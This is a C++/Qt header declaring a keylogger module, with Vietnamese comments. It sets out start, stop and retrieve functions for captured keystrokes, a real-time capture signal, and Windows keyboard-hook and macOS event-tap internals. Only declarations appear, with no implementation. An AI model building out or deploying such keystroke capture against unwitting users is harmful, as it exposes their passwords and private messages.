#ifndef KEYLOGGERMODULE_H
#define KEYLOGGERMODULE_H

#include <QObject>
#include <QString>
#include <QStringList>
#include <QMutex>
#include <QTimer>

#ifdef Q_OS_MACOS
#include <QThread>
#endif

class KeyloggerModule : public QObject
{
    Q_OBJECT

public:
    explicit KeyloggerModule(QObject *parent = nullptr);
    ~KeyloggerModule();

    // Bắt đầu ghi phím
    QString startKeylogger();

    // Dừng ghi phím
    QString stopKeylogger();

    // Lấy dữ liệu đã ghi (toàn bộ)
    QString getKeyloggerData();

    // Kiểm tra trạng thái
    bool isRunning() const;

signals:
    // Real-time: phát mỗi khi có ký tự mới
    void keyTextCaptured(const QString& text);

private slots:
    // Debounce timer timeout → emit keyTextCaptured
    void onDebounceTimeout();

    // Được gọi từ hook callback (thread-safe)
    void startDebounce();

private:
    bool running;
    QStringList keyBuffer;    // Toàn bộ lịch sử cho GET_KEYLOGGER_DATA
    QString pendingChars;     // Ký tự chưa gửi (batching cho IME)
    QMutex mutex;
    QTimer* debounceTimer;    // 50ms debounce cho Unikey/Telex

#ifdef Q_OS_WIN
    // Windows keyboard hook
    static KeyloggerModule* instance;
    static void* hookHandle;   // HHOOK
    static long __stdcall keyboardProc(int nCode,
                                       unsigned long long wParam,
                                       long long lParam);
#endif

#ifdef Q_OS_MACOS
    // macOS CGEventTap
    static KeyloggerModule* instance;
    void* eventTap;       // CFMachPortRef
    void* runLoopSource;  // CFRunLoopSourceRef
    void* tapRunLoop;     // CFRunLoopRef
    QThread* tapThread;

    static void* eventCallback(void* proxy, unsigned long type,
                               void* event, void* userInfo);
    void runMacEventLoop();
    bool checkAccessibilityPermission();
#endif
};

#endif // KEYLOGGERMODULE_H
